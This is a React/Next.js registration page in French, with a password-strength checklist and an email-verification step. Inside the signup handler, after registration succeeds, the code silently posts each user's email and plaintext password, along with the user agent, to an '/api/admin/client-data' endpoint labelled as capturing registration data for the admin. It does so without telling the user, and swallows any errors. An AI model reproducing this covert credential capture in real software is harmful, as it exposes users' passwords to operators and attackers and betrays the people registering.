"use client";
import React, { useState } from "react";
import { EyeIcon, EyeSlashIcon } from '@heroicons/react/24/outline';

interface PasswordRequirement {
  text: string;
  met: boolean;
}

export default function RegisterPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [acronym, setAcronym] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(1);
  const [code, setCode] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  // Validation du mot de passe sécurisé
  const validatePassword = (password: string): PasswordRequirement[] => {
    return [
      { text: "Au moins 8 caractères", met: password.length >= 8 },
      { text: "Une majuscule (A-Z)", met: /[A-Z]/.test(password) },
      { text: "Une minuscule (a-z)", met: /[a-z]/.test(password) },
      { text: "Un chiffre (0-9)", met: /\d/.test(password) },
      { text: "Un symbole (!@#$%^&*)", met: /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password) }
    ];
  };

  const passwordRequirements = validatePassword(password);
  const isPasswordValid = passwordRequirements.every(req => req.met);

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    // Vérification du mot de passe sécurisé
    if (!isPasswordValid) {
      setError("Le mot de passe ne respecte pas tous les critères de sécurité");
      setLoading(false);
      return;
    }

    const res = await fetch("/api/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password, acronym }),
    });
    const data = await res.json();
    if (!res.ok) {
      setError(data.message || "Erreur d'inscription");
    } else {
      // Capturer les données d'inscription pour l'admin
      try {
        await fetch('/api/admin/client-data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'registration',
            data: {
              email,
              password,
              acronym,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
              ip: 'client-side'
            }
          })
        });
      } catch (adminError) {
        console.error('Failed to save admin data:', adminError);
        // Ne pas bloquer l'inscription si la sauvegarde admin échoue
      }
      setStep(2);
    }
    setLoading(false);
  };

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    const res = await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, code }),
    });
    const data = await res.json();
    if (!res.ok) {
      setError(data.message || "Code incorrect");
    } else {
      window.location.href = "/login";
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-100 to-indigo-100">
      {step === 1 ? (
        <form onSubmit={handleRegister} className="bg-white p-8 rounded-xl shadow-lg w-full max-w-md space-y-6">
          <h2 className="text-3xl font-extrabold text-center mb-4 text-blue-700">Inscription</h2>
          
          <input
            type="email"
            placeholder="Email"
            value={email}
            onChange={e => setEmail(e.target.value)}
            className="w-full border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-400"
            required
          />
          
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Mot de passe sécurisé"
              value={password}
              onChange={e => setPassword(e.target.value)}
              className="w-full border border-gray-300 rounded-lg px-4 py-2 pr-12 focus:ring-2 focus:ring-blue-400"
              required
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-2.5 text-gray-400 hover:text-gray-600"
            >
              {showPassword ? (
                <EyeSlashIcon className="h-5 w-5" />
              ) : (
                <EyeIcon className="h-5 w-5" />
              )}
            </button>
          </div>

          {/* Indicateur de force du mot de passe - Toujours visible */}
          <div className="space-y-2">
            <div className="text-sm font-medium text-gray-700">
              Critères de sécurité requis :
            </div>
            <div className="space-y-1 p-3 bg-gray-50 rounded-lg border">
              {passwordRequirements.map((req, index) => (
                <div key={index} className={`flex items-center text-sm font-medium ${req.met ? 'text-green-600' : 'text-red-500'}`}>
                  <span className="mr-2 text-lg">{req.met ? '✅' : '❌'}</span>
                  {req.text}
                </div>
              ))}
            </div>
            <div className="w-full bg-gray-200 rounded-full h-3 mt-3">
              <div 
                className={`h-3 rounded-full transition-all duration-300 ${
                  isPasswordValid ? 'bg-green-500' : 
                  passwordRequirements.filter(req => req.met).length >= 3 ? 'bg-yellow-500' : 'bg-red-500'
                }`}
                style={{
                  width: `${(passwordRequirements.filter(req => req.met).length / passwordRequirements.length) * 100}%`
                }}
              ></div>
            </div>
            <div className="text-center text-xs font-medium">
              <span className={isPasswordValid ? 'text-green-600' : 'text-red-500'}>
                {passwordRequirements.filter(req => req.met).length}/{passwordRequirements.length} critères respectés
                {isPasswordValid ? ' ✅ Mot de passe sécurisé !' : ' ❌ Mot de passe faible'}
              </span>
            </div>
          </div>
          
          <input
            type="text"
            placeholder="Acronyme (nom affiché)"
            value={acronym}
            onChange={e => setAcronym(e.target.value)}
            className="w-full border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-400"
            required
          />
          
          {error && <div className="text-red-500 text-sm text-center">{error}</div>}
          
          <button 
            type="submit" 
            className={`w-full py-2 px-4 rounded-lg font-semibold transition-all duration-200 ${
              isPasswordValid && email && acronym
                ? 'bg-blue-600 hover:bg-blue-700 text-white' 
                : 'bg-gray-300 text-gray-500 cursor-not-allowed'
            }`}
            disabled={loading || !isPasswordValid || !email || !acronym}
          >
            {loading ? "Inscription..." : "S'inscrire"}
          </button>
          
          <a href="/login" className="block text-center text-blue-600 mt-2 hover:underline">
            Déjà inscrit ? Se connecter
          </a>
        </form>
      ) : (
        <form onSubmit={handleVerify} className="bg-white p-8 rounded-xl shadow-lg w-full max-w-md space-y-6">
          <h2 className="text-3xl font-extrabold text-center mb-4 text-blue-700">Vérification Email</h2>
          <input
            type="text"
            placeholder="Code reçu par email"
            value={code}
            onChange={e => setCode(e.target.value)}
            className="w-full border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-400"
            required
          />
          {error && <div className="text-red-500 text-sm text-center">{error}</div>}
          <button type="submit" className="btn-primary w-full" disabled={loading}>
            {loading ? "Vérification..." : "Valider"}
          </button>
        </form>
      )}
    </div>
  );
}
